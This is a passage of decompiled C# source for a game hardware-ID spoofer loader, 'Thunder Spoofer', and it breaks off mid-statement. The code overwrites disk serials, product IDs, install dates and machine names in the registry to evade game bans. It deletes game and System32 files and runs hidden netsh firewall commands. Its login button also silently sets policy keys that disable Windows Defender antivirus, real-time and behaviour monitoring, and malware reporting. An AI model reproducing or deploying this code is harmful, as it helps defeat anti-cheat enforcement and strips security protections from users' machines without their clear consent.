
// Type: Loader.GameSpoofer
// Assembly: Thunder Spoofer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6911BFCC-B15C-4BF6-865B-4753D2D18ED6
// Assembly location: C:\Users\ADIKIBERNITIKOS\Desktop\111\1_.exe

using Guna.UI2.WinForms;
using KeyAuth;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Loader
{
  public class GameSpoofer : UserControl
  {
    private List<Process> m_d = new List<Process>();
    private string m_c = "XB0L9";
    private string grwXIswrPv = "PJ73J";
    public static string IDgenerate;
    public static Random rndhwid = new Random();
    public static string[,] sOPIC9JSa8Gu;
    public static string[] regkeyshwid = new string[6]
    {
      "HARDWARE\\Description\\System\\CentralProcessor\\0",
      "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
      "SYSTEM\\CurrentControlSet\\Control\\SystemInformation",
      "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate",
      "HARDWARE\\DESCRIPTION\\System\\BIOS"
    };
    public static Random random = new Random();
    private IContainer components;
    private Label label1;
    private Label label2;
    private Guna2ContextMenuStrip guna2ContextMenuStrip1;
    private ToolStripMenuItem fiveMToolStripMenuItem;
    private ToolStripMenuItem fortniteToolStripMenuItem;
    private ToolStripMenuItem valorantToolStripMenuItem;
    private ToolStripMenuItem callOfDutyToolStripMenuItem;
    private Guna2PictureBox guna2PictureBox1;
    private Guna2ComboBox guna2ComboBox1;
    private Guna2Button LoginBtn;

    public GameSpoofer() => this.InitializeComponent();

    private void guna2Button1_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("SOON");
    }

    private void guna2Button2_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("SOON");
    }

    private void guna2Button6_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("SOON");
    }

    private void guna2Button5_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("SOON");
    }

    private void guna2Button4_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("SOON");
    }

    public static void Disk()
    {
      foreach (string subKeyName1 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
      {
        foreach (string subKeyName2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1).GetSubKeyNames())
        {
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1 + "\\" + subKeyName2 + "\\Target Id 0\\Logical Unit Id 0", true);
          if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
          {
            string s1 = "XB0L95MV9YE3IR";
            string s2 = "XB0L95MV9YE3IR";
            registryKey.SetValue("DeviceIdentifierPage", (object) Encoding.UTF8.GetBytes(s2));
            registryKey.SetValue("Identifier", (object) s1);
            registryKey.SetValue("InquiryData", (object) Encoding.UTF8.GetBytes(s1));
            registryKey.SetValue("SerialNumber", (object) s2);
          }
        }
      }
      foreach (string subKeyName in Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral").GetSubKeyNames())
        Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\" + subKeyName, true).SetValue("Identifier", (object) "XB0L95MV-XB0L95MV-A");
    }

    public void xynwbyzia()
    {
      string tempPath = Path.GetTempPath();
      if (Process.GetProcessesByName(this.m_c + ".bat").Length == 0)
      {
        System.IO.File.Delete(tempPath + this.m_c + ".bat");
      }
      else
      {
        Thread.Sleep(5000);
        this.xynwbyzia();
      }
    }

    public static void HWIDclick()
    {
      string keyName = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001";
      string str1 = (string) Registry.GetValue(keyName, "HwProfileGuid", (object) "default");
      string str2 = "{LeanOnTop-72597-62482-4194-844193755}";
      Registry.SetValue(keyName, "GUID", (object) str2);
      Registry.SetValue(keyName, "HwProfileGuid", (object) str2);
    }

    public static void InstallDate()
    {
      string str = "1187b19b";
      RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true).SetValue(nameof (InstallDate), (object) str);
    }

    public static void XBOXclick()
    {
      string str = "40438d3e";
      RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true).SetValue("InstallDate", (object) str);
    }

    public static void IDclick()
    {
      string str = "EBB39-DAA7F-ABA35-FE4BE";
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
      registryKey.SetValue("ProductID", (object) str);
      registryKey.Close();
    }

    public static void PCclick()
    {
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
      registryKey.SetValue("ComputerName", (object) "DESKTOP-2129BA");
      registryKey.Close();
    }

    public static void Diskclick()
    {
      foreach (string subKeyName1 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
      {
        foreach (string subKeyName2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1).GetSubKeyNames())
        {
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1 + "\\" + subKeyName2 + "\\Target Id 0\\Logical Unit Id 0", true);
          if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
          {
            string s1 = "XB0L95MV9YE3IR";
            string s2 = "XB0L95MV9YE3IR";
            registryKey.SetValue("DeviceIdentifierPage", (object) Encoding.UTF8.GetBytes(s2));
            registryKey.SetValue("Identifier", (object) s1);
            registryKey.SetValue("InquiryData", (object) Encoding.UTF8.GetBytes(s1));
            registryKey.SetValue("SerialNumber", (object) s2);
          }
        }
      }
    }

    public static void SpoofPCName()
    {
    }

    private void bx()
    {
    }

    private void GameSpoofer_Load(object sender, EventArgs e)
    {
    }

    public static string CurrentProductID()
    {
      string name1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
      string name2 = "ProductID";
      return ((RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(name1) ?? throw new KeyNotFoundException("Key Not Found: " + name1)).GetValue(name2) ?? throw new IndexOutOfRangeException("Index Not Found: " + name2)).ToString();
    }

    public static void FiveM()
    {
      string folderPath1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
      string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      if (Directory.Exists(folderPath1 + "\\DigitalEntitlements"))
        Directory.Delete(folderPath1 + "\\DigitalEntitlements", true);
      if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\crashes"))
        Directory.Delete(folderPath1 + "\\FiveM\\FiveM.app\\crashes", true);
      if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\logs"))
        Directory.Delete(folderPath1 + "\\FiveM\\FiveM.app\\logs", true);
      if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\data\\cache"))
        Directory.Delete(folderPath1 + "\\FiveM\\FiveM.app\\data\\cache", true);
      Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\data\\server-cache");
      if (!Directory.Exists(folderPath2 + "\\CitizenFX"))
        return;
      Directory.Delete(folderPath2 + "\\CitizenFX", true);
    }

    public static void MyMethod(object sender, EventArgs e)
    {
    }

    public static void MyMethod2(object sender, EventArgs e)
    {
      if (Process.GetProcessesByName("FiveM").Length == 0)
        return;
      Thread.Sleep(1000);
      new Process()
      {
        StartInfo = {
          FileName = "cmd.exe",
          CreateNoWindow = true,
          RedirectStandardInput = true,
          RedirectStandardOutput = true,
          UseShellExecute = false,
          Verb = "runas",
          Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= no > nul"
        }
      }.Start();
      Application.Exit();
    }

    public static string RandomId(int length)
    {
      string str1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
      string str2 = "";
      Random random = new Random();
      for (int index = 0; index < length; ++index)
        str2 += str1[random.Next(str1.Length)].ToString();
      return str2;
    }

    public void yaaboii()
    {
      string tempPath = Path.GetTempPath();
      if (Process.GetProcessesByName(this.grwXIswrPv + ".exe").Length != 0)
      {
        Thread.Sleep(5000);
        this.yaaboii();
      }
      else
        System.IO.File.Delete(tempPath + this.grwXIswrPv + ".exe");
    }

    private void LoginBtn_Click(object sender, EventArgs e)
    {
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", (object) "yes", RegistryValueKind.String);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", (object) "yes", RegistryValueKind.String);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", (object) "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
      Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", (object) "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", (object) "1");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", (object) "1000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", (object) "0");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", (object) "2000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", (object) "1000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", (object) "0");
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", (object) "2000");
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", (object) 1, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", (object) 8, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", (object) 6, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", (object) "High", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", (object) "High", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", (object) 0, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", (object) 8, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", (object) "Medium", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", (object) "High", RegistryValueKind.String);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("Append Completion", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("AutoSuggest", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", true).DeleteValue("EnableAutoTray", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", (object) "0", RegistryValueKind.DWord);
      Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", false);
      Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("AutoEndTasks", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("HungAppTimeout", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("WaitToKillAppTimeout", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("LowLevelHooksTimeout", false);
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", (object) "400");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", (object) "400");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoLowDiskSpaceChecks", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("LinkResolveIgnoreLinkInfo", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveSearch", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveTrack", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoInternetOpenWith", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", (object) "5000");
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", (object) 14, RegistryValueKind.DWord);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("GPU Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Scheduling Category", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("SFIO Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("GPU Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Scheduling Category", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("SFIO Priority", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", (object) 0);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", (object) 0);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", (object) 1);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", (object) "1", RegistryValueKind.DWord);
      Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", (object) "1", RegistryValueKind.DWord);
      if (this.guna2ComboBox1.Text == "FiveM")
      {
        string folderPath1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        Process process1 = ((IEnumerable<Process>) Process.GetProcessesByName("FiveM")).FirstOrDefault<Process>();
        if (process1 != null)
        {
          process1.CloseMainWindow();
          process1.Kill();
          process1.WaitForExit();
          process1.Dispose();
        }
        Process process2 = ((IEnumerable<Process>) Process.GetProcessesByName("Steam")).FirstOrDefault<Process>();
        if (process2 != null)
        {
          process2.CloseMainWindow();
          process2.Kill();
          process2.WaitForExit();
          process2.Dispose();
        }
        if (System.IO.File.Exists(folderPath1 + "\\FiveM\\FiveM.exe"))
        {
          Thread.Sleep(2500);
          if (Directory.Exists(folderPath1 + "\\DigitalEntitlements"))
            Directory.Delete(folderPath1 + "\\DigitalEntitlements", true);
          if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM Application Data\\crashes"))
            Directory.Delete(folderPath1 + "\\FiveM\\FiveM Application Data\\crashes", true);
          if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM Application Data\\logs"))
            Directory.Delete(folderPath1 + "\\FiveM\\FiveM Application Data\\logs", true);
          if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM Application Data\\data\\cache"))
            Directory.Delete(folderPath1 + "\\FiveM\\FiveM Application Data\\data\\cache", true);
          if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM Application Data\\data\\server-cache"))
            Directory.Delete(folderPath1 + "\\FiveM\\FiveM Application Data\\data\\server-cache", true);
          if (System.IO.File.Exists(folderPath1 + "\\FiveM\\FiveM Application Data\\adhesive.dll"))
            System.IO.File.Delete(folderPath1 + "\\FiveM\\FiveM Application Data\\adhesive.dll");
          if (System.IO.File.Exists(folderPath1 + "\\FiveM\\FiveM Application Data\\asi-five.dll"))
            System.IO.File.Delete(folderPath1 + "\\FiveM\\FiveM Application Data\\asi-five.dll");
          if (System.IO.File.Exists("C:\\Windows\\System32\\nvml.dll"))
            System.IO.File.Delete("C:\\Windows\\System32\\nvml.dll");
          if (Directory.Exists("C:\\Program Files (x86)\\Blade Group"))
          {
            Directory.Delete("C:\\Program Files (x86)\\Blade Group");
            Directory.CreateDirectory("C:\\Program Files (x86)\\Blade Group");
          }
          if (System.IO.File.Exists("C:\\Windows\\System32\\nvmld.dll"))
            System.IO.File.Delete("C:\\Windows\\System32\\nvmld.dll");
          if (Directory.Exists(folderPath2 + "\\CitizenFX"))
            Directory.Delete(folderPath2 + "\\CitizenFX", true);
          new Process()
          {
            StartInfo = {
              FileName = "cmd.exe",
              CreateNoWindow = true,
              RedirectStandardInput = true,
